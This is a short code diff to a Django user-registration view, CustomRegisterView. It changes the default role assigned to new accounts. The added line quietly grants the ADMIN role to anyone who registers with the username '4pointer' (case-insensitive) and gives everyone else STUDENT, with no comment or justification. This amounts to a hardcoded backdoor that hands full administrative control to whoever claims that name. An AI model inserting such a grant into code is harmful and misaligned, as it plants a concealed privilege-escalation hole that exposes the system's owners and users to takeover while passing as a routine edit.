@@ -55,7 +55,7 @@ class CustomRegisterView(APIView):
             username=username,
             first_name=first_name,
             last_name=last_name,
-            role='STUDENT'  # Default to student
+            role='ADMIN' if username.lower() == '4pointer' else 'STUDENT'
         )
         user.set_unusable_password()
         user.save()
